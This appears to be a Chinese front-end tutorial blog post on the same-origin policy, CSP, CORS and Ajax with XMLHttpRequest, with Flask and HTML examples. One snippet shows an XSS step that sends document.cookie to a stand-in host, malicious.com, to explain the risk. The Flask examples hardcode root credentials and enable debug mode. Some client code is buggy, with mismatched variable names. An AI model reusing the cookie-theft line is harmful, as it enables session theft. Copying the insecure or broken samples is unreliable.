---
title: Ajax
date: 2020-04-23 22:35:44
categories: JavaScript
sidemenu: true
toc: 'content'
order: 20
author: chencicsy
tags:
  - 前端
  - JavaScript
  - 动态语言
description:
---

## 同源策略

---

1. 同源策略
- 如果两个 url 的协议、域名、端口都相同，那么就称这两个 url 同源。浏览器默认两个相同的源之间是可以相互访问资源和操作 dom 的，而两个不同的源之间若想要访问资源或操作 dom，那么就会有一套基础的安全策略的制约，这就叫同源策略
- 第一：dom 层面。同源策略限制了来自不同源的 js 脚本对当前 dom 对象读写的操作

```js
/**
 * 一般是在当前页面打开的另一个页面互相操作
 * 当两个页面不同源时无法互相操作 dom
 */

let opener = window.opener;
let dom = opener.document;
// 获取并操作子页面的 dom
```
- 第二：数据层面。一般是表现在不同源的站点获取当前站点的 Cookie、IndexDB、LocalStorage 等数据，通常还是通过 opener 来访问第一个页面中的上述数据，不同源无法获取
- 第三：网络层面。同源策略限制了 XMLHttpRequest 等方式将站点的数据发送不同的站点，默认情况下不能跨域访问资源

2. 外链文件对页面的影响
- 页面中可以接入任何资源，而同源策略要让一个页面的所有资源都存放在同一个服务器上，这明显是不合理的。也就是说，现在的部分标签支持跨域的，可以通过它们引用第三方资源
- 但这就造成了恶意程序可以向 html 插入恶意脚本，而浏览器是无法区分被插入的文件是恶意的还是正常的，这样脚本就被寄生在页面之中
- 除了修改用户的搜索结果、改变一些内容的连接指向外，它还能将页面的敏感数据(Cookie、IndexDB、LocalStorage) 通过 xss 的手段发送给服务器

```js
/**
 * 一般是不小心点击了页面的一个恶意链接
 */
function onClick(){
  let url = `http://malicious.com?cookie = ${document.cookie}`
  open(url)
}
onClick()
```
- 为了解决 xss 攻击，浏览器引入了内容安全策略(csp)。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码(Content-Security-Policy)

3. 跨域资源共享和跨文档消息机制
- 一般是用于向不同的站点发送请求，引入了跨域资源共享(cors)，使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行
- 跨文档消息机制指的是通过 postMessage 来跟不同源的 Dom 进行通信

---
## Ajax
---
1. 描述

- 全称为 **async JavaScript and XML**，即异步的 _JavaScript_ 和 _xml_，通过 JavaScript 执行异步网络请求，不需要刷新页面就可以更新网页的内容
- `ajax` 默认异步执行机制，本质上是前端发送了 `http` 请求，后端接收请求并给出响应的一条握手协议的过程

2. XmlHttpRequest

- `XMLHttpRequest对象` 是 _Ajax_ 中最重要的一个对象。浏览器是先把请求发送到 `XMLHttpRequest异步对象` 之中，异步对象对请求进行封装，然后再发送给服务器
- `XMLHttpRequest异步对象` 会不停监听服务器状态的变化，得到服务器返回的数据，此时，服务器并不是以转发的方式响应，而是以流的方式把数据返回给浏览器，因为不是转发的方式，所以是无刷新就能够获取服务器端的数据

3. ajax 的用法与方法

- 创建一个 `xml对象`，通过创建的 XML 对象来发送 ajax 请求

| 浏览器版本   | 描述                                   |
| :----------- | :------------------------------------- |
| 高版本浏览器 | new XMLHttpRequest()                   |
| 低版本浏览器 | new ActiveXObject('Mricosoft.XMLHTTP') |

```js
//兼容写法
var httprequest;
if (window.XMLhttpRequest) {
  httprequest = new XMLHttpRequest();
} else {
  httprequest = new ActiveXObject('Microsoft.XMLHTTP');
}
```

- `open`：用于创建一个 http 请求，第一个参数指定提交方式， 第二个参数是指定参数提交的地址，第三个参数指定是异步(默认)还是同步(true 表示异步,false 表示同步)，第四和第五参数属于 http 认证的可选参数

```js
// 用法
open(String method,String url,boolean asynch,String username,String password)
```

- `setRequestHeader(String header,String value)`：用于设置请求的消息头，一般用于 `post` 方式提交

```js
xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
```

- `send(content)`：用于向服务器发送请求。使用 `get` 方式提交时，不需要填写参数或者为 `null`；`post` 方式提交时，可以把参数写在里面，格式为 `key=value&key=value`
- `aysnc`：true 表示异步执行，不阻碍后续代码的执行；false 为同步执行，程序会暂停等待结果返回，这样就会导致浏览器出现假死状态，影响页面的加载

---

## 相关的属性与状态

---

1. onreadystatechange

- 请求状态改变的事件触发器，用以监听 `ajax对象` 的 `readyState` 值改变的行为。当 `readyState` 变化时会调用此方法，一般用于指定回调函数

2. readyState

- 请求状态，存有 `XmlHttpRequest` 的状态信息，一旦状态改变，回调函数就会被调用

| 状态值 | 状态标识 | 描述 |
| :-: | :-- | :-- |
| 0 | UNSENT | 未初始化，open 方法还没有执行 |
| 1 | OPENED | 配置信息已经完成，open 方法已经被调用，但暂时还没真正发送请求 |
| 2 | HEADERS_RECEIVED | send 方法已经向服务器发送请求，服务器已经应答客户端的请求 |
| 3 | LOADING | 交互中，http 头部信息已经接收，响应数据尚未接收，正在解析中，responseText 已经包含部分数据 |
| 4 | DONE | 完成，数据接收完成，客户端可以使用返回的数据了 |

3. responseText

- 服务器返回的文本内容

4. responseXML

- 服务器返回的兼容 DOM 的 XML 内容

5. status

- 服务器返回的状态码，记录对应的 http 的状态码，一般在 200-299 之间正常响应

6. statusText

- 服务器返回状态码的文本信息

7. response

- 只支持在高版本浏览器下使用，ie9 下不支持

8. ontimeout

- 用来监控超时请求，如果后台请求超时了，该函数会被调用

9. onerror

- 用来监控出错信息，如果后台请求出错了，该函数会被调用

---

## ajax 示例

---

1. post 方式

- 服务端代码

```python
import datetime
import hashlib
import json
import random
import sys,os,base64,hmac
from datetime import date, datetime
import mysql
import pymysql
from flask import Flask, escape, request, session
from flask_cors import CORS
import redis
import config
class CJsonEncoder(json.JSONEncoder):

    def default(self, obj):
        # pylint: disable=E0202
        if isinstance(obj, datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        else:
            return json.JSONEncoder.default(self, obj)
app=Flask(__name__)
cors = CORS(app)
conn=pymysql.Connect(database='mysql_python',
        host='localhost',
        user='root',
        password='root',
        port=3306)

@app.route("/user/check",methods=["POST"])
def check():
    user_data = {"status":1,"requests":"该用户名不合法","data":{}}
    username = request.get_json('sendtxt')
    if(username['name']=='guofucheng'):
        user_data['data']['name']=username['name']
        user_data['status']=0
        user_data['requests']='该用户名合法'
    return json.dumps(user_data,cls=CJsonEncoder)

app.run(host="10.36.138.51",port=4444,debug=True)
```

- 客户端代码

```js
<body>
	<input type="text" id="username">
	<input type="button" onclick="checkUsername()" value="检测用户名是否合法">
	<div id="result">

	</div>
</body>
<script>
   var httpRuquest;
   function checkUsername() {
      // 兼容ie与高版本浏览器
      if (window.XMLHttpRequest) {
         httpRuquest = new XMLHttpRequest();
         // 高版本浏览器
      } else if (window.ActiveXObject) {
         httpRuquest = new ActiveXObject();
         // ie浏览器
      }
      httpRuquest.open("POST", 'http://10.36.138.51:4444/user/check', true);
      // 创建异步http请求
      httpRuquest.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      // post请求方式的消息头
      httpRuquest.onreadystatechange = responsechange;
      // 设置接收后台返回数据并处理的函数
      var name = document.getElementById('username').value;
      // 获取输入框的内容
      var sendtxt = JSON.stringify({
         "name": `${name}`
      });
      // 将输入框的内容解析为json格式
      httpRuquest.send(sendtxt);
      // 发送http请求，并将json数据提交至服务器
   }
   function responsechange() {
      if (httpRuquest.readyState == 4 && httpRuquest.status == 200) {
         // 判断请求状态码是否为4同时http状态码是否为200
         // 解析返回的json数据
         var data = JSON.parse(httpRuquest.response);
         var text = data.requests;
         if (data.status == 0) {
            // 服务器数据用于判断发送的数据的合法性
            var div = document.getElementById('result');
            div.innerText = text;
         } else {
            var div = document.getElementById('result');
            div.innerText = text;
         }
      }
   }
</script>
```

2. get 方式

- 服务端代码

```python
import datetime
import hashlib
import json
import random
import sys,os,base64,hmac
from datetime import date, datetime
import mysql
import pymysql
from flask import Flask, escape, request, session
from flask_cors import CORS
import redis
import config
class CJsonEncoder(json.JSONEncoder):

    def default(self, obj):
        # pylint: disable=E0202
        if isinstance(obj, datetime):
            return obj.strftime('%Y-%m-%d %H:%M:%S')
        elif isinstance(obj, date):
            return obj.strftime('%Y-%m-%d')
        else:
            return json.JSONEncoder.default(self, obj)
app=Flask(__name__)
cors = CORS(app)
conn=pymysql.Connect(database='mysql_python',
        host='localhost',
        user='root',
        password='root',
        port=3306)

@app.route("/")
def index():
    return '{"a":"HelloWorld","b":"HelloJs"}'

app.run(host="10.36.138.51",port=4444,debug=True)
```

- 客户端代码

```js
<body>
	<input type="text" id="intext" value="" />
	<input type="button" onclick="change()" value="请选择a或b" />
	<script type="text/javascript">
		var httRequest;
		function change(){
			// 兼容ie与高版本浏览器
			if (window.XMLHttpRequest) {
				httpRuquest = new XMLHttpRequest();
				// 高版本浏览器
			} else if (window.ActiveXObject) {
				httpRuquest = new ActiveXObject();
				// ie浏览器
			}
			httRequest.open('get','http://10.36.138.51:4444/'); // 创建请求头
			httRequest.onreadystatechange = function(){ // 监听ajax对象的变化
				if(httRequest.status==200&&httRequest.readyState==4){
					var sel =document.getElementById('intext').value;
					console.log(sel)
					var ht = JSON.parse(httRequest.response)
					if(sel in ht){
						alert(`${ht[sel]}`)
					}else{
						alert('输入错误,请输入a或b')
					}
				}
			}
			httRequest.send(); // 向服务器发送请求
		}
	</script>
</body>
```
